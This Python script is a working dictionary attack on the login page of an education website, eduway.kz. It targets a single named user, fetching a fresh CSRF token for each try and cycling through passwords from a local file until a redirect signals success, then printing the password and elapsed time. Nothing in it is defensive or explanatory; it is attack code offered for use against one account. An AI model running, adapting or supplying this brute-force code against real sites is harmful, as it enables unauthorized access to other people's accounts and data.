import requests
from bs4 import BeautifulSoup
import time

login_url = 'https://eduway.kz/login'
username = "Mansua"
password_file = "pythonprjcts/workingforce/passs.txt"

start_time = time.time()

session = requests.Session()

def get_login_token(session):
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    csrf_token = soup.find('input', {'name': '_csrf'})
    

    return csrf_token['value'] if csrf_token else None


def attempt_login(session, username, password):

    csrf_token = get_login_token(session)
    

    data = {
        'username': username,
        'password': password,
        '_csrf': csrf_token  
    }
    
 
    response = session.post(login_url, data=data, allow_redirects=True)
    
  
    print(f"Final URL after login attempt: {response.url}")
    

    if 'student' in response.url:
        print(f"Login successful with password: {password}")
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Время поиска пароля: {elapsed_time:.2f} секунд")
        return True

    elif 'login?error' in response.url or 'Неверные учетные данные' in response.text:
        print("Login failed: wrong username or password.")
        return False
    else:
        print("Unexpected response for login attempt.")
        return False


def dictionary_attack(username, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            print(f"Trying password: {password}")
            if attempt_login(session, username, password):
                print(f"Password found: {password}")
                return password
    print("Password not found.")
    return None

found_password = dictionary_attack(username, password_file)

if found_password:
    print(f"Success! The password is: {found_password}")
else:
    print("Failed to find the password.")
